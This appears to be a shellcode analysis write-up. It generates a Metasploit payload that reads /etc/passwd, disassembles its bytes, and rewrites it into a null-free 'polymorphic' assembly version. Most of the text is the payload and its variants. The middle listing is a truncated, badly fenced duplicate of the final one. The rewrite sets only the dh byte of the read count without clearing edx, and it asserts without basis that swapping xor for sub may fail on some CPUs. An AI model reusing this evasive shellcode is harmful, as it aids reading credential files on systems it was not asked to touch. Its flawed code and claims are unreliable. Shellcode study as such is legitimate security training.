

# Analyze: Read File

# Create shellcode
```bash
msfvenom -p linux/x86/read_file -f c PATH=/etc/passwd
```


# Analysis

## Disassemble w/ bash
```bash
echo -n "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u -
```

## Disassembled Assembly

```x86asm
00000000  EB36              jmp short 0x38
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB01000000        mov ebx,0x1
0000002A  CD80              int 0x80
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
00000038  E8C5FFFFFF        call 0x2
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7061              jo 0xa5
00000044  7373              jnc 0xb9
00000046  7764              ja 0xac
00000048  00                db 0x00
```

Here I will dissect the assembly piece by piece, followed by a commented version of theh code in entirety.



## Disassembled (UPDATED)

Here I have cleaned and commented the code, as well as put it in a .nasm format.

I noticed there were a lot of null bytes in the shellcode generated from msfvenom, so my polymorphic code revolves around removing those null bytes.

The first substitution I made is replacing an `xor` with a `sub`. Note that this strategy may not work with all CPUs.

```x86sam
    ; xor ecx,ecx     ; replace xor instructions
    sub ecx,ecx
```
   

    mov ebx,eax     ; ebx now holds file descriptor

    ; mov eax,0x3     ; read()
    xor eax, eax
    mov al, 0x3
                    ; man 2 read
                    ; ssize_t read(int fd, void *buf, size_t count);
    mov edi,esp     
    mov ecx,edi     ; ptr to stack : returned file content will fill this buffer
    ; mov edx,0x1000  ; buf = 4096
    mov dh, 0x10
    int 0x80        ; call read()

    mov edx,eax     ; edx holds number of bytes returned from read()

    ; mov eax,0x4     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 4$"
    xor eax, eax
    mov al, 0x4 
                    ; write()
                    ; man 2 write
                    ; ssize_t write(int fd, const void *buf, size_t count);
    ; mov ebx,0x1     ; 1 = stdout (where to write output)
    xor ebx, ebx
    inc ebx

    int 0x80        ; call write() 
                    ; NOTE: ecx still points to stack (buffer to write)

    ; mov eax,0x1     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 1$"
    xor eax, eax
    inc eax

                    ; man exit
                    ; void exit(int status);
    ; mov ebx,0x0     ; status = 0 = EXIT_SUCCESS
    xor ebx, ebx

    int 0x80        ; call exit()

_jump1:
    call _main    ; jump to main
    db  "/etc/passwd", 0x00
```



## Disassembled (Cleaned and commented)

Here I have cleaned and commented the code

```x86asm
global _start

section .text
_start:
    jmp short _jump1  ; jmp to jump1 (CALCULATE LATER)

_main:
    ;mov eax, 0x5
    push 0x5
    pop eax

    pop ebx         ; <addr> 0x3D (filename from stack) 

    ; xor ecx,ecx     ; replace xor instructions
    sub ecx,ecx
    int 0x80        ; call open() 

    mov ebx,eax     ; ebx now holds file descriptor

    ; mov eax,0x3     ; read()
    xor eax, eax
    mov al, 0x3
                    ; man 2 read
                    ; ssize_t read(int fd, void *buf, size_t count);
    mov edi,esp     
    mov ecx,edi     ; ptr to stack : returned file content will fill this buffer
    ; mov edx,0x1000  ; buf = 4096
    mov dh, 0x10
    int 0x80        ; call read()

    mov edx,eax     ; edx holds number of bytes returned from read()

    ; mov eax,0x4     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 4$"
    xor eax, eax
    mov al, 0x4 
                    ; write()
                    ; man 2 write
                    ; ssize_t write(int fd, const void *buf, size_t count);
    ; mov ebx,0x1     ; 1 = stdout (where to write output)
    xor ebx, ebx
    inc ebx

    int 0x80        ; call write() 
                    ; NOTE: ecx still points to stack (buffer to write)

    ; mov eax,0x1     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 1$"
    xor eax, eax
    inc eax

                    ; man exit
                    ; void exit(int status);
    ; mov ebx,0x0     ; status = 0 = EXIT_SUCCESS
    xor ebx, ebx

    int 0x80        ; call exit()

_jump1:
    call _main    ; jump to main
    db  "/etc/passwd", 0x00
```

